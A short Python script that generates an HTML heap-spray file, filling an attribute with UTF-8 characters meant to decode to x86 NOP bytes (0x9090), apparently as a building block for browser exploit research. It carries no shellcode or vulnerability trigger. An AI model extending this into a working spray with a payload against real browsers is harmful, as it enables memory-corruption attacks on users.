import sys

if __name__ == "__main__":
    f = open("html_spray.html", "w")

    f.write("<html>\n")
    f.write("<head>\n")

    f.write("<meta charset=\"utf-8\" />\n")

    f.write("</head>\n")

    f.write("<body>\n")

    bytes_to_alloc = 0x1000

    for i in range(0, 1):
        #utf-8 character that will equate to 0x9090
        payload = "\xE9\x82\x90" * ((bytes_to_alloc - 2) / 2)

        line = "<h1 id=\"%d\" wonk=\"%s\" />\n" % (i, payload)
        f.write(line)

    f.write("<script>alert('hello');</script>")

    f.close()
    
